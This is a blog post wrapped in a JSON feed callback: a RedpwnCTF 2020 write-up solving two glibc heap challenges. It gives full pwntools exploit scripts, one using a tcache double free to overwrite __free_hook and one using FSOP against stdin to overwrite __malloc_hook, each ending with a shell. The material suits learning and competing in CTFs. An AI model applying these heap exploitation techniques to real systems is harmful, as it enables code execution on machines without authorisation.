// API callback
random_posts({"version":"1.0","encoding":"UTF-8","feed":{"xmlns":"http://www.w3.org/2005/Atom","xmlns$openSearch":"http://a9.com/-/spec/opensearchrss/1.0/","xmlns$blogger":"http://schemas.google.com/blogger/2008","xmlns$georss":"http://www.georss.org/georss","xmlns$gd":"http://schemas.google.com/g/2005","xmlns$thr":"http://purl.org/syndication/thread/1.0","id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982"},"updated":{"$t":"2021-11-30T16:35:33.972-08:00"},"title":{"type":"text","$t":"Will's Root"},"subtitle":{"type":"html","$t":"Pentesting, CTFs, and Writeups"},"link":[{"rel":"http://schemas.google.com/g/2005#feed","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/posts\/default"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=17\u0026max-results=1"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/"},{"rel":"hub","href":"http://pubsubhubbub.appspot.com/"},{"rel":"previous","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=16\u0026max-results=1"},{"rel":"next","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=18\u0026max-results=1"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"generator":{"version":"7.00","uri":"http://www.blogger.com","$t":"Blogger"},"openSearch$totalResults":{"$t":"54"},"openSearch$startIndex":{"$t":"17"},"openSearch$itemsPerPage":{"$t":"1"},"entry":[{"id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982.post-3720848663111966981"},"published":{"$t":"2020-06-25T21:16:00.000-07:00"},"updated":{"$t":"2020-06-25T22:11:09.584-07:00"},"title":{"type":"text","$t":"RedpwnCTF 2020 Pwn Writeups (Four Function Heap, Zero the Hero)"},"content":{"type":"html","$t":"RedpwnCTF 2020 was a really fun CTF and had some great pwns. Here were some of the pwns I found really interesting (my \u003Ca href=\"https:\/\/www.willsroot.io\/2020\/06\/redpwnctf-2020-rust-pwn-writeups.html\" target=\"_blank\"\u003Ewriteups\u003C\/a\u003E for the Rust pwns are posted separately).\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cb\u003EFour Function Heap:\u003C\/b\u003E\u003Cbr \/\u003E\u003Cb\u003E\u003Cbr \/\u003E\u003C\/b\u003EThis is a classic libc 2.27 heap problem with a UAF vulnerability as the pointer is not nulled out after being freed in the delete() function. Like every standard heap pwn, you can do 3 things: allocate, delete, and view. However, it capped you at 14 moves in the main function. Another small tricky part is the indexing rules:\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003Eulong getindex(void)\u003Cbr \/\u003E{\u003Cbr \/\u003E\u0026nbsp; long in_FS_OFFSET;\u003Cbr \/\u003E\u0026nbsp; uint local_14;\u003Cbr \/\u003E\u0026nbsp; long local_10;\u003Cbr \/\u003E\u003Cbr \/\u003E\u0026nbsp; local_10 = *(long *)(in_FS_OFFSET + 0x28);\u003Cbr \/\u003E\u0026nbsp; printf(\"{{prompts.index}}: \");\u003Cbr \/\u003E\u0026nbsp; __isoc99_scanf(\u0026amp;DAT_00100e2a,\u0026amp;local_14);\u003Cbr \/\u003E\u0026nbsp; if (((int)local_14 \u0026lt; 0) || (0 \u0026lt; (int)local_14)) {\u003Cbr \/\u003E\u0026nbsp; \u0026nbsp; ending();\u003Cbr \/\u003E\u0026nbsp; }\u003Cbr \/\u003E\u0026nbsp; if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\u003Cbr \/\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \/* WARNING: Subroutine does not return *\/\u003Cbr \/\u003E\u0026nbsp; \u0026nbsp; __stack_chk_fail();\u003Cbr \/\u003E\u0026nbsp; }\u003Cbr \/\u003E\u0026nbsp; return (ulong)local_14;\u003Cbr \/\u003E}\u003C\/div\u003E\u003Cbr \/\u003EFrom this function, we know we can only access index 0. We can also allocate up to size 0x1000 (enough to free sizes that will directly go into unsorted). Thinking about what we have here, I came up with the following 14 step exploit strategy.\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003E1. Allocate a medium sized tcache chunk (approximately in the 0x200 range)\u003Cbr \/\u003E\u003Cbr \/\u003E2-4. Use the UAF vuln to free it 3 times (double free)\u003Cbr \/\u003E\u003Cbr \/\u003E5. Show this index to get a heap leak from chunk metadata\u003Cbr \/\u003E\u003Cbr \/\u003E6. Allocate a chunk of the same size as step 1, and change the fd pointer to point to the tcache_perthread_struct\u003Cbr \/\u003E\u003Cbr \/\u003E7. Allocate a chunk of the same size again. The next chunk you ask for of this size will be returned at the fd pointer you wrote into the metadata above.\u003Cbr \/\u003E\u003Cbr \/\u003E8. Allocate a chunk of the same size again; as mentioned above, it will be located at the tcache_perthread_struct. Overwrite metadata in a way so that this chunk size and another chunk size appear to be full (count 7 in the tcache_perthread_struct). The original tcache chunk chosen had to be somewhat large too because you need to forge pointers in the location where the tcache_perthread_struct\u0026nbsp;stores pointers to free chunks below. I forged them in a way to return the location of the first chunk we allocated.\u003Cbr \/\u003E\u003Cbr \/\u003E9. Free this chunk over the tcache_perthread_struct; since the tcache for that size appears full, it goes into the unsorted bin.\u003Cbr \/\u003E\u003Cbr \/\u003E10. Grab the main arena leak that got produced in the step above.\u003Cbr \/\u003E\u003Cbr \/\u003E11-13. We now allocate from the other size we filled (although the size I chose had its tcache count overwritten by a large enough number from unsorted bin pointers). Repeat step 6-8 to get a chunk at __free_hook - 8 and overwrite it on the final allocation with \/bin\/sh + system (I found this trick from NotDeGhost's writeups).\u003Cbr \/\u003E\u003Cbr \/\u003E14. Now we can just call free and get a shell!\u003C\/div\u003E\u003Cbr \/\u003EHere's my final exploit:\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003Efrom pwn import *\u003Cbr \/\u003E\u003Cbr \/\u003EIP = \"2020.redpwnc.tf\"\u003Cbr \/\u003EPORT = 31774\u003Cbr \/\u003E\u003Cbr \/\u003Ebin = ELF('.\/four-function-heap')\u003Cbr \/\u003Elibc = ELF('.\/libc.so.6')\u003Cbr \/\u003Ep = remote(IP, PORT)\u003Cbr \/\u003E\u003Cbr \/\u003Edef wait():\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(0.3)\u003Cbr \/\u003E\u003Cbr \/\u003Edef alloc(size, data='A'):\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ewait()\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('1')\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ewait()\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('0')\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ewait()\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(str(size))\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ewait()\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(data)\u003Cbr \/\u003E\u003Cbr \/\u003Edef free():\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ewait()\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('2')\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ewait()\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('0')\u003Cbr \/\u003E\u003Cbr \/\u003Edef show():\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ewait()\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('3')\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ewait()\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('0')\u003Cbr \/\u003E\u003Cbr \/\u003Esize1 = 0x200\u003Cbr \/\u003Esize2 = 0x90\u003Cbr \/\u003E\u003Cbr \/\u003Ealloc(size1)\u003Cbr \/\u003Efor i in range(3):\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Efree()\u003Cbr \/\u003Eshow()\u003Cbr \/\u003Eheapleak = u64(p.recv(6).ljust(8, '\\x00'))\u003Cbr \/\u003Eheapbase = heapleak - 0x260\u003Cbr \/\u003Elog.info(\"Heap leak: \" + hex(heapleak))\u003Cbr \/\u003Ealloc(size1, p64(heapbase+0x10))\u003Cbr \/\u003Ealloc(size1, p64(heapleak)*0x30)\u003Cbr \/\u003Ealloc(size1, p64(0) + p64(0x0000000000000007) + p64(0) * 2 + p64(0x0000000007000000) + p64(0) * 11 + p64(heapleak)*2)\u003Cbr \/\u003Efree()\u003Cbr \/\u003Eshow()\u003Cbr \/\u003Elibcleak = u64(p.recv(6).ljust(8, '\\x00'))\u003Cbr \/\u003Elibc.address = libcleak - 0x3ebca0\u003Cbr \/\u003Elog.info(\"Libc base: \" + hex(libc.address))\u003Cbr \/\u003Ealloc(size2, p64(libc.symbols['__free_hook'] - 8))\u003Cbr \/\u003Ealloc(size2)\u003Cbr \/\u003Ealloc(size2, '\/bin\/sh\\x00' + p64(libc.symbols['system']))\u003Cbr \/\u003Efree()\u003Cbr \/\u003Ep.interactive()\u003Cbr \/\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cbr \/\u003E\u003Cb\u003EZero the Hero\u003C\/b\u003E:\u003Cbr \/\u003E\u003Cbr \/\u003EThis is a more challenging heap problem that required FSOP to pop a shell.\u003Cbr \/\u003E\u003Cbr \/\u003EHere is the entire binary reversed:\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003Evoid main(void)\u003Cbr \/\u003E\u003Cbr \/\u003E{\u003Cbr \/\u003E\u0026nbsp; void *chunk;\u003Cbr \/\u003E\u0026nbsp; long size;\u003Cbr \/\u003E\u003Cbr \/\u003E\u0026nbsp; setbuf(stdout,(char *)0x0);\u003Cbr \/\u003E\u0026nbsp; setbuf(stdin,(char *)0x0);\u003Cbr \/\u003E\u0026nbsp; setbuf(stderr,(char *)0x0);\u003Cbr \/\u003E\u0026nbsp; puts(\"How many zeroes do you want?\");\u003Cbr \/\u003E\u0026nbsp; __isoc99_scanf(\"%ld\",\u0026amp;size);\u003Cbr \/\u003E\u0026nbsp; chunk = malloc(size);\u003Cbr \/\u003E\u0026nbsp; printf(\"I put a bunch of zeroes here: %p\\n\",chunk);\u003Cbr \/\u003E\u0026nbsp; puts(\"How much do you want to read?\");\u003Cbr \/\u003E\u0026nbsp; __isoc99_scanf(\"%ld\",\u0026amp;size);\u003Cbr \/\u003E\u0026nbsp; *(void *)((long)chunk + size) = 0x30;\u003Cbr \/\u003E\u0026nbsp; puts(\"How badly do you want to be a hero?\");\u003Cbr \/\u003E\u0026nbsp; __isoc99_scanf(\"%ms\",\u0026amp;size);\u003Cbr \/\u003E\u0026nbsp; if (size == main) {\u003Cbr \/\u003E\u0026nbsp; \u0026nbsp; system(\"echo flag.txt\");\u003Cbr \/\u003E\u0026nbsp; }\u003Cbr \/\u003E\u0026nbsp; _exit(0);\u003Cbr \/\u003E}\u003C\/div\u003E\u003Cbr \/\u003ESo we can allocate whatever size we want, and can write a 0x30 anywhere since there is no bounds check on indexing; it also leaks you the location of the heap pointer. The last comparison to main is simply a troll.\u003Cbr \/\u003E\u003Cbr \/\u003EWith the first arbitrary malloc size, we can allocate a chunk large enough to force the binary to mmap a new region. If the size is large enough, it should mmap a region right above libc. The offset of that pointer to libc regions should be constant and can be discovered through debugging.\u003Cbr \/\u003E\u003Cbr \/\u003ESince scanf with the %ms specifier guarantees heap usage, the first thing I thought of was FSOP. We can use the unindexed write to change a byte in _IO_2_1_stdin_'s _IO_buf_end, therefore allowing us to overwrite file structures as well as __malloc_hook under the file structures in memory. However, in order for this write to work, we had to bruteforce to ensure that changing a byte to 0x30 will allow us to reach _malloc_hook but not too much below (which can risk segfaulting or breaking other parts of the program, as we do need to preserve the contents of memory there as closely as possible).\u003Cbr \/\u003E\u003Cbr \/\u003EWith some debugging, I noticed a pattern of 0x2a appearing every few instances as the second lowest byte for the _IO_buf_end of _IO_2_1_stdin_; flipping that to 0x30 will allow us reach to __malloc_hook, but not too far afterwards. We can carefully overwrite the file structures (basically, you want to preserve their memory contents), and just flip __malloc_hook to a one gadget. This bruteforce will also require you to write into main arena regions, but since we are targeting __malloc_hook, we can just destroy the heap as malloc will never reach that stage. Here is my final exploit (I highly recommend using eu_unstrip to remerge complete libc debug symbols because the file structures have a lot of different symbols that you won't find in a standard libc file):\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003Efrom pwn import *\u003Cbr \/\u003E\u003Cbr \/\u003EIP = \"2020.redpwnc.tf\"\u003Cbr \/\u003EPORT = 31643\u003Cbr \/\u003E\u003Cbr \/\u003Ebin = ELF('.\/zero')\u003Cbr \/\u003Elibc = ELF('.\/libc.so.6')\u003Cbr \/\u003E\u003Cbr \/\u003Edef wait():\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(0.1)\u003Cbr \/\u003E\u003Cbr \/\u003Egoodleaks = False\u003Cbr \/\u003Ewhile not goodleaks:\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep = remote(IP, PORT)\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Edef wait():\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Ep.recvrepeat(0.1)\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvuntil('do you want?\\n')\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('12345678')\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Eleak = int(p.recvline().split()[-1], 16) #heap chunk on mmap\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Elibc.address = leak + 0xbc6ff0\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Eonegadget = libc.address + 0x10a38c\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Estdiniobufend = libc.symbols['_IO_2_1_stdin_'] + 64\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Eshortbuf = libc.address + 0x3eba83\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Eif int(hex(shortbuf)[10:12], 16) == 0x2a:\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Egoodleaks = True\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Eelse:\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Ep.close()\u003Cbr \/\u003Elog.info(\"Heap pointer leak: %s\" % hex(leak))\u003Cbr \/\u003Elog.info(\"Libc base: %s\" % hex(libc.address))\u003Cbr \/\u003Elog.info(\"Possible one gadgets: %s\" % hex(onegadget))\u003Cbr \/\u003Elog.info(\"stdin shortbuf: %s\" % hex(shortbuf))\u003Cbr \/\u003Elog.info(\"stdin buf end: %s\" % hex(stdiniobufend))\u003Cbr \/\u003Ep.recvuntil(\"want to read?\\n\")\u003Cbr \/\u003Ep.sendline(str(stdiniobufend - leak + 1))\u003Cbr \/\u003E\u003Cbr \/\u003Epayload = (''\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ '\\x00' * 5\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(libc.symbols['_IO_stdfile_0_lock'])\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(0xffffffffffffffff)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(0)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(libc.symbols['_IO_wide_data_0'])\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(0) * 3\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(0x00000000ffffffff)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(0) * 2\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(libc.symbols['_IO_file_jumps'])\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(0) * 19 * 2\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(libc.address + 0x3e7d60)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(0)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(libc.symbols['memalign_hook_ini'])\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(libc.symbols['realloc_hook_ini'])\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(onegadget) #overwrite malloc hook\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ p64(0)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ '\\x00' * 0x400 #heap can be destroyed, __malloc_hook will prevent it from ever checking the heap\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E+ '')\u003Cbr \/\u003Ep.sendline(payload)\u003Cbr \/\u003Ep.interactive()\u003C\/div\u003E\u003Cbr \/\u003EThe bruteforce really shouldn't take over a few seconds. Overall, this challenge was very fun. Thanks to NotDeGhost for writing these fun problems!\u003Cbr \/\u003E\u003Cbr \/\u003EThere were also pwnables written in Rust during this CTF, which was pretty interesting as it was my first time dealing with non C binaries in pwn. I managed to finish all of them and made writeups of them \u003Ca href=\"https:\/\/www.willsroot.io\/2020\/06\/redpwnctf-2020-rust-pwn-writeups.html\" target=\"_blank\"\u003Ehere\u003C\/a\u003E."},"link":[{"rel":"replies","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/3720848663111966981\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"https:\/\/www.willsroot.io\/2020\/06\/redpwnctf-2020-pwn-writeups-four.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/3720848663111966981"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/3720848663111966981"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/2020\/06\/redpwnctf-2020-pwn-writeups-four.html","title":"RedpwnCTF 2020 Pwn Writeups (Four Function Heap, Zero the Hero)"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"thr$total":{"$t":"0"}}]}});